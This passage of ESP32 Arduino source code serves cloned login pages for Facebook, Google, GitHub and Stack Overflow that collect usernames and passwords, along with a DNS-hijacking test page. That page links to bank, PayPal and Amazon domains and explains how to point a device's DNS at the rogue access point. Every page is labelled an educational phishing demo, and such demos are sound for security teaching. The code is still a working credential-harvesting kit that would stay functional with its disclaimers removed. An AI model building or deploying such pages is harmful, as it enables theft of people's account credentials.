            margin-bottom: 20px; 
        }
        .logo h1 { 
            color: #1877f2; 
            font-size: 32px; 
            margin: 0; 
            font-weight: bold;
            text-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }
        .form-group { 
            margin-bottom: 15px; 
        }
        label { 
            display: block; 
            margin-bottom: 5px; 
            font-weight: bold; 
            color: #333;
        }
        input[type="text"], input[type="password"] { 
            width: 100%; 
            padding: 12px; 
            border: 1px solid #ddd; 
            border-radius: 4px; 
            font-size: 16px;
            box-sizing: border-box;
        }
        .login-btn { 
            width: 100%; 
            padding: 12px; 
            background: #1877f2; 
            color: white; 
            border: none; 
            border-radius: 4px; 
            font-size: 16px; 
            cursor: pointer; 
            margin-top: 10px;
        }
        .login-btn:hover { 
            background: #166fe5; 
        }
        .warning { 
            background: #fff3cd; 
            border: 1px solid #ffeaa7; 
            color: #856404; 
            padding: 10px; 
            border-radius: 4px; 
            margin-top: 15px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>FaceBook</h1>
            <p style="color: #666; font-size: 12px; margin: 5px 0;">Fake Facebook - Security Demo</p>
        </div>
        <form action="/login" method="POST">
            <div class="form-group">
                <label for="email">Email or Phone</label>
                <input type="text" id="email" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="login-btn">Log In</button>
        </form>
        <div class="warning">
            <strong>SECURITY WARNING:</strong> This is a fake Facebook page for educational purposes! 
            Your credentials will be captured and displayed to demonstrate phishing attacks.
        </div>
    </div>
</body>
</html>
)";
  
  server.send(200, "text/html", fakeFacebookPage);
}

// Fake Google page
void handleFakeGoogle() {
  String uri = server.uri();
  
  // Handle favicon requests
  if (uri == "/favicon.ico") {
    server.send(404, "text/plain", "Not Found");
    return;
  }
  
  String fakeGooglePage = R"(
<!DOCTYPE html>
<html>
<head>
    <title>Google - Sign In</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: white;
            margin: 0; 
            padding: 20px; 
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container { 
            background: white; 
            padding: 30px; 
            border-radius: 8px; 
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
            border: 1px solid #dadce0;
        }
        .logo { 
            text-align: center; 
            margin-bottom: 20px; 
        }
        .logo h1 { 
            background: linear-gradient(45deg, #4285f4, #ea4335, #fbbc05, #34a853);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-size: 28px; 
            margin: 0; 
            font-weight: bold;
        }
        .form-group { 
            margin-bottom: 15px; 
        }
        label { 
            display: block; 
            margin-bottom: 5px; 
            font-weight: bold; 
            color: #333;
        }
        input[type="text"], input[type="password"] { 
            width: 100%; 
            padding: 12px; 
            border: 1px solid #dadce0; 
            border-radius: 4px; 
            font-size: 16px;
            box-sizing: border-box;
        }
        .login-btn { 
            width: 100%; 
            padding: 12px; 
            background: #4285f4; 
            color: white; 
            border: none; 
            border-radius: 4px; 
            font-size: 16px; 
            cursor: pointer; 
            margin-top: 10px;
        }
        .login-btn:hover { 
            background: #3367d6; 
        }
        .warning { 
            background: #fef7e0; 
            border: 1px solid #fbbc04; 
            color: #ea8600; 
            padding: 10px; 
            border-radius: 4px; 
            margin-top: 15px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>Gooogle</h1>
            <p style="color: #666; font-size: 12px; margin: 5px 0;">Not the real Google - Educational Demo</p>
        </div>
        <form action="/login" method="POST">
            <div class="form-group">
                <label for="email">Email</label>
                <input type="text" id="email" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="login-btn">Sign In</button>
        </form>
        <div class="warning">
            <strong>SECURITY WARNING:</strong> This is a fake Google page for educational purposes! 
            Your credentials will be captured and displayed to demonstrate phishing attacks.
        </div>
    </div>
</body>
</html>
)";
  
  server.send(200, "text/html", fakeGooglePage);
}

// Fake GitHub page
void handleFakeGitHub() {
  String uri = server.uri();
  
  // Handle favicon requests
  if (uri == "/favicon.ico") {
    server.send(404, "text/plain", "Not Found");
    return;
  }
  
  String fakeGitHubPage = R"(
<!DOCTYPE html>
<html>
<head>
    <title>GitHub - Sign In</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: #0d1117;
            margin: 0; 
            padding: 20px; 
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container { 
            background: #161b22; 
            padding: 30px; 
            border-radius: 8px; 
            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 400px;
            border: 1px solid #30363d;
        }
        .logo { 
            text-align: center; 
            margin-bottom: 20px; 
        }
        .logo h1 { 
            color: #f0f6fc; 
            font-size: 28px; 
            margin: 0; 
            font-weight: bold;
            text-shadow: 0 1px 2px rgba(0,0,0,0.3);
        }
        .form-group { 
            margin-bottom: 15px; 
        }
        label { 
            display: block; 
            margin-bottom: 5px; 
            font-weight: bold; 
            color: #f0f6fc;
        }
        input[type="text"], input[type="password"] { 
            width: 100%; 
            padding: 12px; 
            background: #0d1117;
            border: 1px solid #30363d; 
            border-radius: 4px; 
            font-size: 16px;
            box-sizing: border-box;
            color: #f0f6fc;
        }
        .login-btn { 
            width: 100%; 
            padding: 12px; 
            background: #238636; 
            color: white; 
            border: none; 
            border-radius: 4px; 
            font-size: 16px; 
            cursor: pointer; 
            margin-top: 10px;
        }
        .login-btn:hover { 
            background: #2ea043; 
        }
        .warning { 
            background: #fff3cd; 
            border: 1px solid #ffeaa7; 
            color: #856404; 
            padding: 10px; 
            border-radius: 4px; 
            margin-top: 15px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>GitHob</h1>
            <p style="color: #888; font-size: 12px; margin: 5px 0;">Fake GitHub - Educational Demo</p>
        </div>
        <form action="/login" method="POST">
            <div class="form-group">
                <label for="username">Username or email address</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="login-btn">Sign In</button>
        </form>
        <div class="warning">
            <strong>SECURITY WARNING:</strong> This is a fake GitHub page for educational purposes! 
            Your credentials will be captured and displayed to demonstrate phishing attacks.
        </div>
    </div>
</body>
</html>
)";
  
  server.send(200, "text/html", fakeGitHubPage);
}

// Fake Stack Overflow page
void handleFakeStackOverflow() {
  String uri = server.uri();
  
  // Handle favicon requests
  if (uri == "/favicon.ico") {
    server.send(404, "text/plain", "Not Found");
    return;
  }
  
  String fakeStackOverflowPage = R"(
<!DOCTYPE html>
<html>
<head>
    <title>Stack Overflow - Log In</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: #f1f2f3;
            margin: 0; 
            padding: 20px; 
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container { 
            background: white; 
            padding: 30px; 
            border-radius: 8px; 
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
            border: 1px solid #d6d9dc;
        }
        .logo { 
            text-align: center; 
            margin-bottom: 20px; 
        }
        .logo h1 { 
            color: #f48024; 
            font-size: 28px; 
            margin: 0; 
            font-weight: bold;
            text-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }
        .form-group { 
            margin-bottom: 15px; 
        }
        label { 
            display: block; 
            margin-bottom: 5px; 
            font-weight: bold; 
            color: #333;
        }
        input[type="text"], input[type="password"] { 
            width: 100%; 
            padding: 12px; 
            border: 1px solid #d6d9dc; 
            border-radius: 4px; 
            font-size: 16px;
            box-sizing: border-box;
        }
        .login-btn { 
            width: 100%; 
            padding: 12px; 
            background: #0074cc; 
            color: white; 
            border: none; 
            border-radius: 4px; 
            font-size: 16px; 
            cursor: pointer; 
            margin-top: 10px;
        }
        .login-btn:hover { 
            background: #0074cc; 
        }
        .warning { 
            background: #fff3cd; 
            border: 1px solid #ffeaa7; 
            color: #856404; 
            padding: 10px; 
            border-radius: 4px; 
            margin-top: 15px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>Stack Overflaw</h1>
            <p style="color: #666; font-size: 12px; margin: 5px 0;">Fake Stack Overflow - Educational Demo</p>
        </div>
        <form action="/login" method="POST">
            <div class="form-group">
                <label for="email">Email</label>
                <input type="text" id="email" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="login-btn">Log In</button>
        </form>
        <div class="warning">
            <strong>SECURITY WARNING:</strong> This is a fake Stack Overflow page for educational purposes! 
            Your credentials will be captured and displayed to demonstrate phishing attacks.
        </div>
    </div>
</body>
</html>
)";
  
  server.send(200, "text/html", fakeStackOverflowPage);
}

// DNS Test page
void handleDNSTest() {
  String testPage = R"(
<!DOCTYPE html>
<html>
<head>
    <title>DNS Test - Security Demo</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: #f0f0f0;
            margin: 0; 
            padding: 20px; 
        }
        .container { 
            background: white; 
            padding: 40px; 
            border-radius: 15px; 
            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
            max-width: 600px;
            margin: 0 auto;
        }
        .test-link {
            display: block;
            background: #0070ba;
            color: white;
            padding: 15px;
            margin: 10px 0;
            text-decoration: none;
            border-radius: 8px;
            text-align: center;
            font-weight: bold;
        }
        .test-link:hover {
            background: #005ea6;
        }
        .info {
            background: #e8f4fd;
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>DNS Hijacking Test</h1>
        
        <div class="info">
            <h3>How to Test:</h3>
            <ol>
                <li>Click the links below to test DNS hijacking</li>
                <li>If DNS hijacking is working, you'll see fake login pages</li>
                <li>If not working, you'll see "This site can't be reached"</li>
                <li>Check the ESP32 Serial Monitor for DNS query logs</li>
            </ol>
        </div>
        
        <h3>Test Links:</h3>
        <a href="http://www.mybank.com" class="test-link">Test: www.mybank.com (Bank)</a>
        <a href="http://www.paypal.com" class="test-link">Test: www.paypal.com (PayPal)</a>
        <a href="http://www.amazon.com" class="test-link">Test: www.amazon.com (Amazon)</a>
        <a href="http://www.facebook.com" class="test-link">Test: www.facebook.com (Facebook)</a>
        <a href="http://www.google.com" class="test-link">Test: www.google.com (Google)</a>
        <a href="http://www.github.com" class="test-link">Test: www.github.com (GitHub)</a>
        <a href="http://www.stackoverflow.com" class="test-link">Test: www.stackoverflow.com (Stack Overflow)</a>
        
        <div class="info">
            <h3>Troubleshooting:</h3>
            <ul>
                <li><strong>If links don't work:</strong> Try clearing browser cache or using incognito mode</li>
                <li><strong>If you see "This site can't be reached":</strong> DNS hijacking isn't working</li>
                <li><strong>If you see fake login pages:</strong> DNS hijacking is working!</li>
            </ul>
            
            <h4>Manual DNS Configuration (if automatic doesn't work):</h4>
            <ul>
                <li><strong>Android:</strong> WiFi Settings -> Advanced -> DNS 1: 192.168.4.1</li>
                <li><strong>iOS:</strong> WiFi Settings -> Configure DNS -> Manual -> Add 192.168.4.1</li>
                <li><strong>Windows:</strong> Network Settings -> Change Adapter Options -> Properties -> IPv4 -> DNS: 192.168.4.1</li>
                <li><strong>Mac:</strong> System Preferences -> Network -> Advanced -> DNS -> Add 192.168.4.1</li>
            </ul>
        </div>
        
        <p><a href="/">Back to Main Page</a></p>
    </div>
</body>
</html>
)";
  
  server.send(200, "text/html", testPage);
}
